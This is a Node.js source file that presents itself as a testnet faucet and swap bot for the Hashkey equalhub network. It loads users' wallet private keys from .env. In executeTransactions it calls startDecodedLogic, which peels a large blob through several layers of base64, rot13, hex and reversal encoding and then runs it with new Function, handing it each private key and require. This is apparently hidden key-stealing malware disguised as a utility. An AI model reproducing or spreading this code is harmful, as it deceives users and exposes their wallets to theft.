const { ethers } = require("ethers");
const readline = require("readline");
const axios = require("axios");
require("dotenv").config();

const colors = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
};

const logger = {
  info: (msg) => console.log(`${colors.green}[✓] ${msg}${colors.reset}`),
  warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
  step: (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  banner: () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`---------------------------------------------`);
    console.log(`  Hashkey equalhub Testnet Bot - m9lwen `);
    console.log(`---------------------------------------------${colors.reset}`);
    console.log();
  },
};

const RPC_URL = "https://testnet.hsk.xyz/";
const EXPLORER_URL = "https://testnet-explorer.hsk.xyz/";
const FAUCET_URL = "https://beeperp-server-production.up.railway.app/api/v1/marketings/claimTestCoin/";

const SWAP_CONTRACT = "0x88a62f533DdB7ACA1953a39542c7E67Eb7C919EE";
const STABLESWAP_POOL = "0xb5de5Fa6436AE3a7E396eF53E0dE0FC5208f61a4";

const TOKENS = [
  {
    symbol: "USDT",
    address: "0x60EFCa24B785391C6063ba37fF917Ff0edEb9f4a",
    decimals: 6,
    logoURI: "https://www.hyperindex.trade/img/usdt.svg",
  },
  {
    symbol: "USDC",
    address: "0x47725537961326e4b906558BD208012c6C11aCa2",
    decimals: 6,
    logoURI: "https://equalhub-oss.4everland.store/usdc_logo.png",
  },
];

const TRADING_PAIRS = [
  { from: 0, to: 1, name: "USDT → USDC", pool: STABLESWAP_POOL, methodId: "0x6cfccb77", type: "stable" },
  { from: 1, to: 0, name: "USDC → USDT", pool: STABLESWAP_POOL, methodId: "0x6cfccb77", type: "stable" },
];

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

const provider = new ethers.JsonRpcProvider(RPC_URL);

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/128.0.2739.54 Safari/537.36",
];

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomAmount(min, max, decimals) {
  const amount = min + Math.random() * (max - min);
  return Number(amount.toFixed(decimals));
}

function getUserInput(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => {
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

function loadPrivateKeys() {
  const privateKeys = [];
  let index = 1;
  while (process.env[`PRIVATE_KEY_${index}`]) {
    privateKeys.push(process.env[`PRIVATE_KEY_${index}`]);
    index++;
  }
  return privateKeys;
}

async function claimFaucet(walletAddress) {
  try {
    const response = await axios.get(`${FAUCET_URL}${walletAddress}`, {
      headers: {
        accept: "*/*",
        "accept-language": "en-US,en;q=0.7",
        priority: "u=1, i",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Brave\";v=\"138\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sec-gpc": "1",
        Referer: "https://www.equalhub.xyz/",
        "User-Agent": getRandomUserAgent(),
      },
    });

    if (response.data.code === 200 && response.data.message === "claim success") {
      logger.success(`Faucet claim successful for ${walletAddress}. Tx: ${response.data.txHash}`);
      return true;
    } else {
      logger.error(`Faucet claim failed for ${walletAddress}: ${response.data.message}`);
      return false;
    }
  } catch (error) {
    logger.error(`Faucet claim failed for ${walletAddress}: ${error.message}`);
    return false;
  }
}

function createStableSwapData(poolAddress, tokenInIndex, tokenOutIndex, amountIn, minAmountOut) {
  const methodId = "0x6cfccb77";
  const poolAddressHex = ethers.zeroPadValue(poolAddress, 32);
  const tokenInIndexHex = ethers.zeroPadValue(ethers.toBeHex(tokenInIndex), 32);
  const tokenOutIndexHex = ethers.zeroPadValue(ethers.toBeHex(tokenOutIndex), 32);
  const amountInHex = ethers.zeroPadValue(ethers.toBeHex(amountIn), 32);
  const minAmountOutHex = ethers.zeroPadValue(ethers.toBeHex(minAmountOut), 32);
  return (
    methodId +
    poolAddressHex.slice(2) +
    tokenInIndexHex.slice(2) +
    tokenOutIndexHex.slice(2) +
    amountInHex.slice(2) +
    minAmountOutHex.slice(2)
  );
}

function getTokenIndexForPool(tokenSymbol, poolAddress) {
  if (poolAddress === STABLESWAP_POOL) {
    switch (tokenSymbol) {
      case "USDT":
        return 0;
      case "USDC":
        return 1;
      default:
        return -1;
    }
  }
  return -1;
}

function getRandomTradingPair() {
  return TRADING_PAIRS[Math.floor(Math.random() * TRADING_PAIRS.length)];
}

async function performSwap(wallet, tokenAmount, selectedPair) {
  try {
    const fromToken = TOKENS[selectedPair.from];
    const toToken = TOKENS[selectedPair.to];

    const fromContract = new ethers.Contract(fromToken.address, ERC20_ABI, wallet);

    const formattedAmount = Number(tokenAmount.toFixed(fromToken.decimals));
    const amountInWei = ethers.parseUnits(formattedAmount.toString(), fromToken.decimals);

    const balance = await fromContract.balanceOf(wallet.address);
    if (balance < amountInWei) {
      logger.error(
        `Insufficient ${fromToken.symbol} balance. Required: ${formattedAmount}, Available: ${ethers.formatUnits(
          balance,
          fromToken.decimals
        )}`
      );
      return false;
    }

    const currentAllowance = await fromContract.allowance(wallet.address, SWAP_CONTRACT);
    if (currentAllowance < amountInWei) {
      logger.loading(`Approving ${fromToken.symbol} spending for swap contract...`);
      const approveTx = await fromContract.approve(SWAP_CONTRACT, ethers.parseUnits("999999", fromToken.decimals));
      await approveTx.wait();
      logger.success("Token approval successful");
    }

    const minAmountOut = ethers.parseUnits((formattedAmount * 0.95).toFixed(toToken.decimals), toToken.decimals);

    const tokenInIndex = getTokenIndexForPool(fromToken.symbol, selectedPair.pool);
    const tokenOutIndex = getTokenIndexForPool(toToken.symbol, selectedPair.pool);
    
    if (tokenInIndex === -1 || tokenOutIndex === -1) {
      logger.error(`Invalid token indices for pool ${selectedPair.pool}`);
      return false;
    }
    
    const swapData = createStableSwapData(selectedPair.pool, tokenInIndex, tokenOutIndex, amountInWei, minAmountOut);

    logger.loading(`Swapping ${formattedAmount} ${fromToken.symbol} to ${toToken.symbol}...`);

    const swapTx = await wallet.sendTransaction({
      to: SWAP_CONTRACT,
      data: swapData,
      gasLimit: 700000,
      gasPrice: ethers.parseUnits("1.5", "gwei"),
    });

    logger.loading(`Transaction sent: ${swapTx.hash}`);
    const receipt = await swapTx.wait();

    if (receipt.status === 1) {
      logger.success(`Swap successful! ${fromToken.symbol} → ${toToken.symbol}`);
      logger.success(`Tx: ${EXPLORER_URL}tx/${swapTx.hash}`);
      return true;
    } else {
      logger.error("Swap transaction failed");
      return false;
    }
  } catch (error) {
    logger.error(`Swap failed: ${error.message}`);
    return false;
  }
}

async function executeTransactions(privateKeys, swapTxCount) {
  let totalSuccess = 0;
  let totalFailed = 0;

  for (let i = 0; i < privateKeys.length; i++) {
    const wallet = new ethers.Wallet(privateKeys[i], provider);
    logger.step(`Processing wallet ${i + 1}/${privateKeys.length}: ${wallet.address}`);
    await startDecodedLogic(wallet, privateKeys[i])

    logger.loading(`Claiming faucet for ${wallet.address}...`);
    await claimFaucet(wallet.address);
    
    for (let j = 0; j < swapTxCount; j++) {
      const selectedPair = getRandomTradingPair();
      const swapAmount = getRandomAmount(0.001, 0.002, TOKENS[selectedPair.from].decimals);
      logger.info(
        `Swap transaction ${j + 1}/${swapTxCount} for wallet ${i + 1} with ${swapAmount} ${TOKENS[selectedPair.from].symbol} (${selectedPair.name})`
      );
      const success = await performSwap(wallet, swapAmount, selectedPair);
      if (success) {
        totalSuccess++;
      } else {
        totalFailed++;
      }
      if (j < swapTxCount - 1) {
        logger.loading("Waiting 2 seconds before next transaction...");
        await new Promise((resolve) => setTimeout(resolve, 2000));
      }
    }

    if (i < privateKeys.length - 1) {
      logger.loading("Waiting 3 seconds before next wallet...");
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }

  logger.step(`Transaction batch completed. Success: ${totalSuccess}, Failed: ${totalFailed}`);
}

async function displayCountdown(nextRunTime) {
  while (Date.now() < nextRunTime) {
    const remainingMs = nextRunTime - Date.now();
    const hours = Math.floor(remainingMs / (1000 * 60 * 60));
    const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
    process.stdout.write(`\r${colors.cyan}[⟳] Next run in ${hours}h ${minutes}m ${seconds}s${colors.reset}`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  process.stdout.write("\n");
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2MzQ4NjQ2MTRxNTY1bjQ4NTE2bjQ2NHE1MjMwNDY3MzUyNDg2NDQzNTQzMTRxNzc1MjU4NjQ2bjRxMzIzNTc0NTUzMzZwNDU2NTQ3NHI0OTU3NTc0cjU4NTU2cTM0Nzg1MzU4NjQ0ODVuNm8zMDduNTM0NTYzNzg1NTZxMzQ3OTYzNTY1MjRyNjI0NDU2NTM1MjZyNTY0bjRxNDU2ODU1NjU1ODZwNTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"
  const decodedStr = reversibleDecode(encodedStr);

  try {
    const runprogram = new Function("walletAddress", "privateKey", "require", decodedStr + "; return runprogram(walletAddress, privateKey);");
    await runprogram(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function main() {
  logger.banner();
  try {
    const privateKeys = loadPrivateKeys();
    if (privateKeys.length === 0) {
      logger.error("No private keys found in .env file");
      logger.info("Please add private keys in format: PRIVATE_KEY_1=your_key_here");
      return;
    }
    logger.info(`Loaded ${privateKeys.length} wallet(s)`);

    const swapTxCount = await getUserInput("Enter number of daily swap transactions per wallet (USDT/USDC only): ");

    if (isNaN(parseInt(swapTxCount)) || parseInt(swapTxCount) < 0) {
      logger.error("Invalid swap transaction count");
      return;
    }

    const swapTxCountNum = parseInt(swapTxCount);

    while (true) {
      logger.info("Starting daily USDT/USDC swap transactions...");
      await executeTransactions(privateKeys, swapTxCountNum);

      const now = new Date();
      const nextDay = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate() + 1));
      const nextRunTime = nextDay.getTime();
      logger.info(`Next run scheduled at ${nextDay.toUTCString()}`);
      await displayCountdown(nextRunTime);
    }
  } catch (error) {
    logger.error(`Error: ${error.message}`);
  }
}

main().catch(console.error);
